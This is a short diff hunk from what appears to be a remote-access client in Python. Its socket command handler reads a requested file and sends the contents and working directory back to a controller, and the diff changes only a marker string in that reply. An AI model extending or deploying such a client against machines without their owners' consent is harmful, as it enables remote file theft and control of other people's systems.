@@ -113,7 +113,7 @@ def receive_commands():
         elif data[:8].decode("utf-8") == "download":
             tekst = read_file(data[9:].decode("utf-8"))
             print(str(tekst))
-            s.send(str.encode(tekst + str(os.getcwd()) + ">"))
+            s.send(str.encode(tekst + str(os.getcwd()) + ">down-file"))
 
         elif data[:5].decode("utf-8") == "start":
             create_thread2()
